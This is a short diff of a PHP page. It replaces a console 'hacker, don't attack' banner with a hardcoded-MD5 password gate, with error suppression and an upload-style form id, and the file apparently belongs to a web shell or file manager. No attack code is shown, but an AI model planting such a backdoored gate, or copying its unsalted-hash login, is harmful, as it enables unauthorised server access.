@@ -35,22 +35,28 @@
 
 	</script>
 
-	<script type="text/javascript">
-		console.log(`
-
-			🅷🅰🅲🅺🅴🆁
-			🅹🅰🅽🅶🅰🅽
-			🅼🅴🅽🆈🅴🆁🅰🅽🅶
-
-			`);
-		console.log('Hacker jangan menyerang !!');
-	</script>
-
-
-
 	<?php
 
 	error_reporting(0);
+	session_start();
+	// session_destroy();
+	
+
+	$password = "b68b70b4fa5d1aa81292d4ceb48fcca7"; //md5 : openfile
+	
+	if (isset($_POST['password'])) {
+		
+		$_SESSION['password'] = md5($_POST['password']);
+
+	}
+
+	if (strval($_SESSION['password'])!=$password) {
+		echo '<form action="" method="post" >';
+		echo '<input type="text" name="password" size="50"> <input type="submit" id="_upl" value="Login"></form>';
+		die();
+	}
+
+
 
 	echo 'User Agent: '.$_SERVER['HTTP_USER_AGENT'];
 	echo "<br>";
